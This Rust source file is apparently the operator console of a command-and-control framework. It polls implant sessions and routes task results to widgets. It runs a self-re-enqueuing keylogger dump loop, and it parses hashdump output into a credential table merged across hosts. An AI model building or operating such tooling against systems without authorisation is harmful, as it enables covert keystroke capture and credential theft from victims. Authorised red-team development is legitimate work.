//! Polling: session-list refresh, per-session result draining, continuous
//! keylog-stream upkeep, and routing drained rows to their display surfaces.

use std::time::{Duration, Instant};

use makepad_widgets::makepad_platform::makepad_network::ui_signal::ToUISender;

use super::rest::{self, ResultView};
use super::{
    log_push, session_signature, short, take_snapshot, BofState, BofUpdate, Snapshot, WorkerState,
};

/// What kind of task a pending entry is, so its result can be routed to the
/// right UI surface (shell output → event log; BOF output → BOF history).
#[derive(Clone)]
pub(crate) enum TaskKind {
    /// A generic task whose result is just text to print to the console.
    /// The string is the command name shown in the log (e.g. "shell", "ping").
    Generic(String),
    Ls,
    Ps,
    Hashdump,
    /// BOF, carrying its display name + args for the history row.
    Bof {
        name: String,
        args: String,
    },
    /// Continuous keylog dump — re-enqueues itself on completion. The worker's
    /// `keylog_streaming` state is the single source of truth (so
    /// `KeylogStreamStop` clears the stream even while a dump task is in
    /// flight). Output is routed like `Generic("keylog")` — line-by-line to the
    /// session console.
    KeylogStream,
}

/// A task whose result the worker is still polling.
pub(crate) struct PendingTask {
    pub session: String,
    pub task_id: u64,
    pub kind: TaskKind,
    pub backoff: Duration,
    pub last_poll: Instant,
}

impl WorkerState {
    /// Refresh the session list and push a snapshot when anything the UI cares
    /// about changed (list signature, connection transition, pending output).
    pub(super) async fn poll_sessions(
        &mut self,
        client: &reqwest::Client,
        to_ui: &ToUISender<Snapshot>,
    ) {
        let Some((srv, token)) = &self.server else {
            return;
        };
        match rest::fetch_sessions(client, srv, token).await {
            Ok(list) => {
                let sig = session_signature(&list);
                let changed = sig != self.last_session_sig;
                // A successful fetch means we ARE connected. If that differs
                // from what we last told the UI, we must push a snapshot even
                // when nothing else changed — otherwise an empty initial
                // session list (sig "" == initial "") leaves the UI stuck on
                // "Disconnected" forever, because the `changed || log || bof`
                // guard below would all be false.
                let connected_changed = !self.was_connected;
                self.was_connected = true;
                // A successful fetch ends the connect attempt. While the request
                // was in flight the stage read Connecting (DNS+TCP+TLS+request
                // bundled by reqwest). reqwest's GaiResolver isn't publicly
                // constructable, so we can't isolate DNS/TCP as separate stages
                // without a DNS-resolver hook — see the design spec §4.5. On a
                // fast localhost link Resolving→Connecting→Done collapses to a
                // single frame, which reads honestly.
                self.settle_connect_ok();
                if changed {
                    self.last_session_sig = sig;
                }
                if changed
                    || connected_changed
                    || !self.log_buf.is_empty()
                    || !self.bof_updates.is_empty()
                    || !self.console_lines.is_empty()
                {
                    let _ = to_ui.send(take_snapshot(
                        &mut self.log_buf,
                        true,
                        &list,
                        &mut self.bof_updates,
                        &mut self.console_lines,
                        self.connect.connecting,
                        self.connect.stage,
                    ));
                }
            }
            Err(e) => {
                // A failed fetch means we are NOT connected. Mirror the
                // connected_changed logic so a drop is always reported too.
                self.was_connected = false;
                self.settle_connect_err();
                log_push(&mut self.log_buf, format!("! sessions: {e}"));
                let _ = to_ui.send(take_snapshot(
                    &mut self.log_buf,
                    false,
                    &[],
                    &mut self.bof_updates,
                    &mut self.console_lines,
                    self.connect.connecting,
                    self.connect.stage,
                ));
            }
        }
    }

    /// Drain task results — ONE request per session per tick.
    ///
    /// `/api/results` DRAINS the session's entire result queue server-side,
    /// so the old per-task poll (one request per pending task, keeping only
    /// the row matching that task) silently discarded every other in-flight
    /// task's result whenever two tasks overlapped: the first poller
    /// drained the queue and the rest polled an empty list forever. Group
    /// pending by session instead, drain each session with at least one due
    /// task exactly once (the 2s tick keeps drains ≥500ms apart), and route
    /// EVERY returned row: matched rows take their task's kind-specific
    /// display path; orphans (no matching pending entry — e.g. enqueued by
    /// another client) go to the console + log so no result is ever lost.
    pub(super) async fn drain_due_results(&mut self, client: &reqwest::Client) {
        // Clone the target once per tick so the borrow doesn't pin `self`
        // across the per-session drain loop (2s cadence — negligible).
        let Some((srv, token)) = self.server.clone() else {
            return;
        };
        let mut drain_sessions: Vec<String> = Vec::new();
        for t in &self.pending {
            if t.last_poll.elapsed() >= t.backoff && !drain_sessions.contains(&t.session) {
                drain_sessions.push(t.session.clone());
            }
        }
        for session in drain_sessions {
            match rest::drain_results(client, &srv, &session, &token).await {
                Ok(rows) => {
                    for r in &rows {
                        if let Some(pos) = self
                            .pending
                            .iter()
                            .position(|t| t.session == session && t.task_id == r.task_id)
                        {
                            let t = self.pending.remove(pos);
                            route_result(
                                &session,
                                t.kind,
                                r,
                                &mut self.log_buf,
                                &mut self.bof_updates,
                                &mut self.console_lines,
                            );
                        } else {
                            // Orphan result: nothing pending for this task id.
                            // Surface it rather than dropping it silently.
                            let text = if r.kind == "ok" {
                                "ok".to_string()
                            } else {
                                rest::result_text(r)
                            };
                            let line =
                                format!("[{}] task {}: {}", short(&session), r.task_id, text);
                            log_push(&mut self.log_buf, line.clone());
                            self.console_lines.push((session.clone(), line));
                        }
                    }
                    // Due tasks whose row wasn't in this batch missed the
                    // drain: stay pending with a doubled backoff (capped),
                    // same as the old per-task miss path.
                    let now = Instant::now();
                    for t in self
                        .pending
                        .iter_mut()
                        .filter(|t| t.session == session && t.last_poll.elapsed() >= t.backoff)
                    {
                        t.backoff = t.backoff.saturating_mul(2).min(Duration::from_secs(4));
                        t.last_poll = now;
                    }
                }
                Err(e) => {
                    log_push(&mut self.log_buf, format!("[{}] ! {}", short(&session), e));
                    // Mirror the old per-task error path: a failed poll drops
                    // the due tasks, surfacing an Error row for any BOF.
                    let mut i = 0;
                    while i < self.pending.len() {
                        if self.pending[i].session == session
                            && self.pending[i].last_poll.elapsed() >= self.pending[i].backoff
                        {
                            let t = self.pending.remove(i);
                            if let TaskKind::Bof { name, args } = t.kind {
                                self.bof_updates.push(BofUpdate {
                                    name,
                                    args,
                                    status: BofState::Error,
                                });
                            }
                        } else {
                            i += 1;
                        }
                    }
                }
            }
        }
    }

    /// Auto-enqueue the next keylog dump if streaming is active and no dump
    /// task for that session is currently pending. The prior dump (Done) has
    /// just been dropped from `pending`, so this is where the continuous
    /// stream actually loops — the new task sits in the queue until the
    /// session polls next, and its result re-enters the routing path on a
    /// later drain. `backoff` is set to the interval so the first drain
    /// waits the full interval rather than firing immediately. Mirrors the
    /// TUI's keylog-stream re-enqueue block.
    pub(super) async fn keylog_stream_upkeep(&mut self, client: &reqwest::Client) {
        let Some((srv, token)) = self.server.clone() else {
            return;
        };
        if let Some((kl_session, kl_interval)) = self.keylog_streaming.clone() {
            let has_pending = self
                .pending
                .iter()
                .any(|t| t.session == kl_session && matches!(t.kind, TaskKind::KeylogStream));
            if !has_pending {
                let cmd_json = serde_json::json!({ "type": "keylog", "action": 2 });
                match rest::enqueue_task(client, &srv, &kl_session, cmd_json, &token).await {
                    Ok(tid) => {
                        self.pending.push(PendingTask {
                            session: kl_session.clone(),
                            task_id: tid,
                            kind: TaskKind::KeylogStream,
                            // Delay first poll by the interval so dumps are
                            // spaced `kl_interval` apart rather than hammering.
                            backoff: Duration::from_secs(kl_interval as u64),
                            last_poll: Instant::now(),
                        });
                    }
                    Err(e) => log_push(&mut self.log_buf, format!("! keylog stream: {e}")),
                }
            }
        }
    }
}

/// Route one drained result row to its task's display surface:
/// Generic/KeylogStream → event log + session console; Ls/Ps/Hashdump →
/// parsed into their widgets; Bof → BOF history. `kind` is consumed so the
/// Bof arm can move its name/args into the history update. The per-kind
/// display logic is the old per-task poll's routing match, carried over
/// unchanged — except Generic now gives explicit feedback for no-output
/// ("ok") commands instead of silently skipping them.
fn route_result(
    session: &str,
    kind: TaskKind,
    r: &ResultView,
    log_buf: &mut Vec<String>,
    bof_updates: &mut Vec<BofUpdate>,
    console_lines: &mut Vec<(String, String)>,
) {
    let out = rest::result_text(r);
    match kind {
        TaskKind::Generic(name) => {
            if r.kind == "ok" {
                // No-output commands (ping, sleep, …) report kind "ok", which
                // result_text maps to "" — and the old code's empty-check then
                // dropped them, giving zero feedback. Show them explicitly.
                let line = format!("[{}] {}: ok", short(session), name);
                log_push(log_buf, line.clone());
                console_lines.push((session.to_string(), line));
            } else if !out.is_empty() {
                log_push(log_buf, format!("[{}] {}: {}", short(session), name, out));
                console_lines.push((session.to_string(), out));
            }
        }
        TaskKind::Ls => {
            if !out.is_empty() {
                let entries = crate::parse::parse_any_files(&out);
                log_push(
                    log_buf,
                    format!("[{}] ls loaded {} items", short(session), entries.len()),
                );
                if let Ok(mut files) = crate::widgets::file_tree::FILES.write() {
                    *files = entries;
                }
            }
        }
        TaskKind::Ps => {
            if !out.is_empty() {
                let entries = crate::parse::parse_any_procs(&out);
                log_push(
                    log_buf,
                    format!("[{}] ps loaded {} items", short(session), entries.len()),
                );
                if let Ok(mut procs) = crate::widgets::process_table::PROCS.write() {
                    *procs = entries;
                }
            }
        }
        TaskKind::Hashdump => {
            if !out.is_empty() {
                let mut entries = crate::parse::parse_creds(&out);
                // add session source info to each entry
                for e in &mut entries {
                    if e.source == "localhost" {
                        e.source = session.to_string();
                    }
                }
                // Namespace placeholder / no-domain creds by session so the
                // same principal harvested from two different hosts doesn't
                // collide on ("", principal) and silently overwrite the
                // earlier session's record. (parse_creds emits source=""
                // for no-domain lines; without this, session A's "alice"
                // and session B's "alice" would clobber each other.)
                for e in &mut entries {
                    if e.source.is_empty() || e.source == "localhost" {
                        e.source = session.to_string();
                    }
                }
                log_push(
                    log_buf,
                    format!(
                        "[{}] parsed {} credentials",
                        short(session),
                        entries.len()
                    ),
                );
                // Merge by (source, principal, kind): a re-run of hashdump
                // refreshes the same principal+kind in place, while a hash
                // and a cleartext password for the same principal (different
                // kinds) coexist. Without this, every hashdump doubled the
                // table with stale copies. Never silently drop the batch on
                // a lock failure — log it so the operator knows creds were
                // lost (the cred-store RwLock isn't expected to poison, but
                // staying non-silent is the contract everywhere else here).
                match crate::widgets::cred_table::CREDS.write() {
                    Ok(mut creds) => {
                        for e in entries {
                            if let Some(slot) = creds.iter_mut().find(|c| {
                                c.source == e.source
                                    && c.principal == e.principal
                                    && c.kind == e.kind
                            }) {
                                slot.secret = e.secret;
                            } else {
                                creds.push(e);
                            }
                        }
                    }
                    Err(_) => log_push(
                        log_buf,
                        format!(
                            "[{}] ! cred store lock poisoned; {} parsed creds dropped",
                            short(session),
                            entries.len(),
                        ),
                    ),
                }
            }
        }
        TaskKind::Bof { name, args } => {
            let status = if out.starts_with("[error]") {
                BofState::Error
            } else {
                BofState::Done
            };
            if !out.is_empty() {
                log_push(log_buf, format!("[{}] bof {}: {}", short(session), name, out));
            }
            bof_updates.push(BofUpdate { name, args, status });
        }
        // Continuous keylog dump: route line-by-line to the session console
        // like Generic. The auto-enqueue loop in the worker keeps the stream
        // going while `keylog_streaming` is set.
        TaskKind::KeylogStream => {
            if !out.is_empty() {
                log_push(log_buf, format!("[{}] keylog: {}", short(session), out));
                console_lines.push((session.to_string(), out));
            }
        }
    }
}
